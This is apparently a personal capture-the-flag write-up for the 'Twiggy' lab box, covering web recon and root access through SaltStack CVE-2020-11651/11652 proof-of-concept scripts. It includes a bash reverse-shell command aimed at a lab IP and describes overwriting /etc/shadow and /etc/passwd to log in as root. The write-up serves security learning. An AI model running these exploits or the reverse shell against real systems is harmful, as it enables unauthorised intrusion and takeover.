# Twiggy Writeup

Name: Twiggy
Date:  19/9/2023
Difficulty:  Easy
Goals: 
- Boxes from the list
Learnt:
- Python uses relative path not absolute! 
Beyond Root:
- SaltStack investigation

Another CTF with a amusing picture
![](ChicagaUSA.png)
## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](OS-ProvingGrounds/Twiggy/Screenshots/ping.png)

![](nsklookupdns.png)

[Ports 4505-6 Are SaltStack Firewall](https://docs.saltproject.io/en/latest/topics/tutorials/firewall.html) - retrospectively this is weird that I at the time was very hesitant to RCE a firewall.
![](serachsploit-salt.png)

#### HTTP
Django with [Source for Mezzanine a CMS framework for Django](https://github.com/stephenmcd/mezzanine)

[No deafult password for mezzanine - admin : default ](https://www.virtuozzo.com/company/blog/how-to-get-mezzanine-cms-inside-jelastic-cloud/)

![](xxs-mezzanine.png)

The picture:
![](ChicagaUSA.png)
...has no interesting metadata
![](nometadata.png))

Site has anti-directory busting. Potential content discovery defences as Feroxbuster return a lot of http 500 status codes.

Search has three options
- Everything
- Blogs
- Pages

No upload button..
![](uploads.png)

Crawling the for vulnerable javascriptinterseting
![](gogospider.png)

Mapping out the root web page
![](congratz.png)

Before really looking into the proxy on 8000 reveals cherrypy 5.6
![](poc-cherrypyver.png)

Snyk is the goodest dog, but no CherryPy exploits
![](snykonnovulnscherrypy.png)

Contact does not actually do anything
![](nocontactworking.png)

Checked `/about/team`, `/about/history`, `/contact/lintersetingegals`
![](legals.png)
![](about.png)
![](history.png)
![](team.png)

Played around with all the http requests to test whether we get sqli, cmdi, file traversal or lfi for 
```
http://192.168.141.62/admin/login/?next=/admin/
```



![](adminpages.png)

Interesting Error message I checked that is in relation to the nginx conf file not settable through a http request
![](debugequaltruepng.png)


Without disclosing a hint there is a RCE, which is a hint without giving a hint.

I tried using python virtual environments to install and run nginxpwner for potential enumeration of if it was vulnerable.
```bash
git clone https://github.com/stark0de/nginxpwner.git
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```


## Exploit

Port 4505, 4506 [ZeroMQ](https://en.wikipedia.org/wiki/ZeroMQ) is a message library. [hackerone pre 2.1 is vulnerable to fuzzing attacks](https://hackerone.com/reports/477073). ZeroMQ ZMTP 2.0 has a [packet storm metasploit module](https://packetstormsecurity.com/files/157678/SaltStack-Salt-Master-Minion-Unauthenticated-Remote-Code-Execution.html) for the SaltStack. Annoyingly my biggest mistake in this is that ZeroMQ is not SaltStack and I trusted `nmap` to identify the service.


![](serachsploit-salt.png)

Metasploit will not work as the mezz user has `/bin/false` - in hindsight 
![](sadmsfpython.png)

Similarly with dealing with any exploits these days that are `python3` use virtual environments 
```bash
git clone https://github.com/dozernz/cve-2020-11651.git
python3 -m venv .venv
source .venv/bin/activate
pip3 install salt
# did not work
python3 CVE-2020-11651.py 192.168.242.62 master '/bin/bash -i >& /dev/tcp/192.168.45.191/4444 0>&1'
```
And for the other CVE PoCsinterseting
```bash
git clone https://github.com/Al1ex/CVE-2020-11652.git
python3 -m venv .venv
source .venv/bin/activate
pip3 install salt
python3 CVE-2020-11652.py -h # for help
```

Initial I fat figured the 2 and 8
![](nocve202011651.png)

Reran
![](anotherfatfiguringip.png)
But no response..![](legals.png)

With [CVE-2020-11652](https://github.com/Al1ex/CVE-2020-11652/blob/main/CVE-2020-11652.py) we can read files
![](wecanreadfiles.png)
And the /etc/shadow file has weird permission so we could add records to the shadow file
![](andshadowfileread.png)

[/bin/false - service account without a shell](https://www.baeldung.com/linux/bin-true-bin-false-commands), No ssh keys to read and `/etc/ssh/sshd.config` 

![](sadhashcat.png)

Copied the `/etc/nginx/nginx.conf` file to remember the location. Give everything we cant actually run anything in the mezz user context, but given the lose file permission of the both passwd and shadow files we can just upload our own.

Learnt that python uses relative paths
![](relativepythonpaths.png)

Upload a new a shadow and passwd file to login
![](r00tedintheshadowfile.png)

And ssh in!
![](iamr00t.png)


## Beyond Root

ChatGPT says: *"SaltStack, now known as Salt Project, is an open-source infrastructure automation and configuration management tool. It is used to automate the deployment and management of infrastructure, including servers, network devices, and cloud resources. One of the features of SaltStack is the ability to manage firewalls, although it doesn't have a specific "SaltStack Firewall" component."* ...

[Salt / SaltStack](https://en.wikipedia.org/wiki/Salt_(software)) *is a Python-based, [open-source software](https://en.wikipedia.org/wiki/Open-source_software "Open-source software") for event-driven IT automation, remote task execution, and [configuration management](https://en.wikipedia.org/wiki/Configuration_management)* ...uses *the [ZeroMQ](https://en.wikipedia.org/wiki/ZeroMQ "ZeroMQ") messaging library to facilitate the high-speed requirements and built Salt using [ZeroMQ](https://docs.saltproject.io/en/latest/topics/transports/zeromq.html) for all networking layers.*

[Firewall port](https://docs.saltproject.io/en/latest/topics/tutorials/firewall.html)
TCP port 4506 is the master 
TCP port 4505 is the slave  

ZeroMQ 2.0 is vulnerable to a RCE.